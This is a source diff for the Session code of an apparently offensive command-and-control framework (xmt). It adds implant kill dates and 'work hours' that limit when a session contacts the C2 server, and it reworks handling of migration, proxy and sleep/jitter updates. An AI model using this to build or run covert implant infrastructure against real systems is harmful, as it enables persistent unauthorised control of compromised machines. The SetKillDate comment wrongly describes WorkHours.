@@ -23,6 +23,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/c2/task"
 	"github.com/iDigitalFlame/xmt/com"
@@ -54,7 +55,7 @@ type Session struct {
 	Created time.Time
 	connection
 
-	swap            Profile
+	swap            cfg.Profile
 	ch, wake        chan struct{}
 	parent          *Listener
 	send, recv, chn chan *com.Packet
@@ -68,6 +69,8 @@ type Session struct {
 	peek     *com.Packet
 	host     container
 	proxies  []proxyData
+	kill     *time.Time
+	work     *cfg.WorkHours
 
 	Device device.Machine
 	sleep  time.Duration
@@ -151,8 +154,13 @@ func (s *Session) Job(i uint16) *Job {
 func (s *Session) Listener() *Listener {
 	return s.parent
 }
+func (s *Session) hasJob(j uint16) bool {
+	// There's no need to lock here.
+	_, ok := s.jobs[j]
+	return ok
+}
 func (s *Session) handle(p *com.Packet) bool {
-	if p == nil || p.Device.Empty() || (p.ID != RvResult && p.ID != RvMigrate) || p.Job < 2 {
+	if p == nil || p.Device.Empty() || p.ID != RvResult || p.Job < 2 {
 		return false
 	}
 	if s.jobs == nil || len(s.jobs) == 0 {
@@ -163,7 +171,7 @@ func (s *Session) handle(p *com.Packet) bool {
 	}
 	if s.state.Moving() {
 		if cout.Enabled {
-			s.log.Warning("[%s/ShC] Dropping Job %d as Session is being Migrated!", s.ID, p.Job)
+			s.log.Error("[%s/ShC] Dropping Job %d as Session is being Migrated!", s.ID, p.Job)
 		}
 		return true
 	}
@@ -176,7 +184,7 @@ func (s *Session) handle(p *com.Packet) bool {
 		return false
 	}
 	if cout.Enabled {
-		s.log.Info("[%s/ShC] Received response for Job %d.", s.ID, j.ID)
+		s.log.Debug("[%s/ShC] Received response for Job %d.", s.ID, j.ID)
 	}
 	if j.Result, j.Complete, j.Status = p, time.Now(), StatusCompleted; p.Flags&com.FlagError != 0 {
 		j.Status = StatusError
@@ -213,7 +221,7 @@ func (s *Session) frag(i, id, max, cur uint16) {
 		s.m.queue(event{j: j, jf: j.Update})
 	}
 	if cout.Enabled {
-		s.log.Trace("[%s/Frag] Tracking Job %d Frag Group %X, Current %d of %d.", s.ID, i, id, cur+1, max)
+		s.log.Trace("[%s/Frag] Tracking Job %d Frag Group 0x%X, Current %d of %d.", s.ID, i, id, cur+1, max)
 	}
 }
 
@@ -283,33 +291,6 @@ func (s *Session) setProfile(b []byte) (*Job, error) {
 	return s.Task(n)
 }
 
-// SetProfile will set the Profile used by this Session. This function will
-// ensure that the profile is marshalable before setting and will then pass it
-// to be set by the client Session (if this isn't one already).
-//
-// If this is a server-side Session, this will trigger the sending of a MvProfile
-// Packet to update the client-side instance, which will update on it's next
-// wakeup cycle.
-//
-// If this is a client-side session the error 'ErrNoTask' will be returned AFTER
-// setting the Profile and indicates that no Packet will be sent and that the
-// Job object result is nil.
-func (s *Session) SetProfile(p Profile) (*Job, error) {
-	if p == nil {
-		return nil, ErrInvalidProfile
-	}
-	m, ok := p.(marshaler)
-	if !ok {
-		return nil, xerr.Sub("cannot marshal Profile", 0x50)
-	}
-	b, err := m.MarshalBinary()
-	if err != nil {
-		return nil, xerr.Wrap("cannot marshal Profile", err)
-	}
-	s.p = p
-	return s.setProfile(b)
-}
-
 // Tasklet is a function similar to Task and will attach a JobID to the specified
 // Packet created by the supplied Tasklet and wil return a Job promise that can be
 // used to internally keep track of a response Packet with a matching Job ID.
@@ -327,6 +308,32 @@ func (s *Session) Tasklet(t task.Tasklet) (*Job, error) {
 	if err != nil {
 		return nil, err
 	}
+	return s.Task(n)
+}
+
+// SetKillDate sets the KillDate for this Session. This is a setting that controls
+// the date when this Session will shutdown automatically.
+//
+// Use the WorkHours functions to create one or do it manually. If a nil value
+// is passed (or an empty WorkHours) this will clear the current WorkHours setting.
+//
+// Changing the WorkHours when there perviously was a non-nil setting will wake
+// the Session if it's sleeping.
+//
+// If this is a Server-side Session, the new value will be sent to the Client in
+// a MvTime Packet.
+func (s *Session) SetKillDate(t time.Time) (*Job, error) {
+	if t.IsZero() {
+		s.kill = nil
+	} else {
+		s.kill = &t
+	}
+	if s.parent == nil {
+		return nil, ErrNoTask
+	}
+	n := &com.Packet{ID: task.MvTime, Device: s.Device.ID}
+	n.WriteUint8(timeKillDate)
+	n.WriteInt64(t.Unix())
 	return s.Task(n)
 }
 
@@ -353,15 +360,79 @@ func (s *Session) SetSleep(t time.Duration) (*Job, error) {
 // setting the Profile and indicates that no Packet will be sent and that the
 // Job object result is nil.
 func (s *Session) SetProfileBytes(b []byte) (*Job, error) {
-	if ProfileParser == nil {
-		return nil, xerr.Sub("no Profile parser loaded", 0x44)
-	}
-	p, err := ProfileParser(b)
+	p, err := parseProfile(b)
 	if err != nil {
 		return nil, xerr.Wrap("parse Profile", err)
 	}
 	s.p = p
 	return s.setProfile(b)
+}
+
+// SetProfile will set the Profile used by this Session. This function will
+// ensure that the profile is marshalable before setting and will then pass it
+// to be set by the client Session (if this isn't one already).
+//
+// If this is a server-side Session, this will trigger the sending of a MvProfile
+// Packet to update the client-side instance, which will update on it's next
+// wakeup cycle.
+//
+// If this is a client-side session the error 'ErrNoTask' will be returned AFTER
+// setting the Profile and indicates that no Packet will be sent and that the
+// Job object result is nil.
+func (s *Session) SetProfile(p cfg.Profile) (*Job, error) {
+	if p == nil {
+		return nil, ErrInvalidProfile
+	}
+	m, ok := p.(marshaler)
+	if !ok {
+		return nil, xerr.Sub("cannot marshal Profile", 0x50)
+	}
+	b, err := m.MarshalBinary()
+	if err != nil {
+		return nil, xerr.Wrap("cannot marshal Profile", err)
+	}
+	s.p = p
+	return s.setProfile(b)
+}
+
+// SetWorkHours sets the WorkingHours for this Session. This is a setting that
+// controls WHEN the Session will talk to the C2 Server.
+//
+// Use the WorkHours functions to create one or do it manually. If a nil value
+// is passed (or an empty WorkHours) this will clear the current WorkHours setting.
+//
+// Changing the WorkHours when there perviously was a non-nil setting will wake
+// the Session if it's sleeping.
+//
+// If this is a Server-side Session, the new value will be sent to the Client in
+// a MvTime Packet.
+func (s *Session) SetWorkHours(w *cfg.WorkHours) (*Job, error) {
+	if w == nil || w.Empty() {
+		if s.work != nil {
+			s.Wake()
+		}
+		if s.work = nil; s.parent == nil {
+			return nil, ErrNoTask
+		}
+		n := &com.Packet{ID: task.MvTime, Device: s.Device.ID}
+		n.WriteUint8(timeWorkHours)
+		n.WriteUint32(0)
+		n.WriteUint8(0)
+		return s.Task(n)
+	}
+	if err := w.Verify(); err != nil {
+		return nil, err
+	}
+	if s.work != nil {
+		s.Wake()
+	}
+	if s.work = w; s.parent == nil {
+		return nil, ErrNoTask
+	}
+	n := &com.Packet{ID: task.MvTime, Device: s.Device.ID}
+	n.WriteUint8(timeWorkHours)
+	w.MarshalStream(n)
+	return s.Task(n)
 }
 
 // SetDuration sets the wake interval period and Jitter for this Session. This is
@@ -388,37 +459,53 @@ func (s *Session) SetDuration(t time.Duration, j int) (*Job, error) {
 	if t > 0 {
 		s.sleep = t
 	}
-	// NOTE(dij): This may cause a de-sync issue when combined with a smaller
-	//            initial timeout only on channels.
-	//            (Just the bail below)
 	if s.parent == nil {
 		return nil, ErrNoTask
 	}
 	n := &com.Packet{ID: task.MvTime, Device: s.Device.ID}
-	n.WriteUint8(s.jitter)
+	n.WriteUint16(uint16(s.jitter)) // timeSleepJitter (0) is implied here
 	n.WriteUint64(uint64(s.sleep))
 	return s.Task(n)
 }
 func (s *Session) handleInfoResult(i uint16, t uint8, n *com.Packet) {
-	// Handle server-side updates to info
 	switch t {
-	case task.MvTime:
-		if err := n.ReadUint8(&s.jitter); err != nil {
+	case task.MvProxy:
+		var err error
+		if s.proxies, err = s.readDeviceInfo(infoProxy, n); err != nil {
 			if cout.Enabled {
-				s.log.Warning("[%s/ShC] Error reading MvTime Job %d jitter: %s!", s.ID, i, err.Error())
+				s.log.Error("[%s/Cr0] Error reading MvProxy Job %d result: %s!", s.ID, i, err.Error())
 			}
-			break
 		}
-		if err := n.ReadInt64((*int64)(&s.sleep)); err != nil {
+		if cout.Enabled {
+			s.log.Debug("[%s/Cr0] Client indicated that it updated it's Proxy details, updating local Proxy information.", s.ID)
+		}
+	case task.MvMigrate:
+		if _, err := s.readDeviceInfo(infoSyncMigrate, n); err != nil {
 			if cout.Enabled {
-				s.log.Warning("[%s/ShC] Error reading MvTime Job %d sleep: %s!", s.ID, i, err.Error())
+				s.log.Error("[%s/Cr0] Error reading MvMigrate Job %d result: %s!", s.ID, i, err.Error())
 			}
+		}
+		if cout.Enabled {
+			s.log.Debug("[%s/Cr0] Client indicated that it migrated, updating local Session information.", s.ID)
 		}
 	case task.MvRefresh:
-		if err := s.Device.UnmarshalStream(n); err != nil {
+		var err error
+		if s.proxies, err = s.readDeviceInfo(infoRefresh, n); err != nil {
 			if cout.Enabled {
-				s.log.Warning("[%s/ShC] Error reading MvRefresh Job %d Machine info: %s!", s.ID, i, err.Error())
+				s.log.Error("[%s/Cr0] Error reading MvRefresh Job %d result: %s!", s.ID, i, err.Error())
 			}
+		}
+		if cout.Enabled {
+			s.log.Debug("[%s/Cr0] Client indicated that it refreshed it's details, updating local Session information.", s.ID)
+		}
+	case task.MvTime, task.MvProfile:
+		if _, err := s.readDeviceInfo(infoSync, n); err != nil {
+			if cout.Enabled {
+				s.log.Error("[%s/Cr0] Error reading MvTime/MvProfile Job %d result: %s!", s.ID, i, err.Error())
+			}
+		}
+		if cout.Enabled {
+			s.log.Debug("[%s/Cr0] Client indicated that it changed profile/time, updating local Session information.", s.ID)
 		}
 	default:
 		return
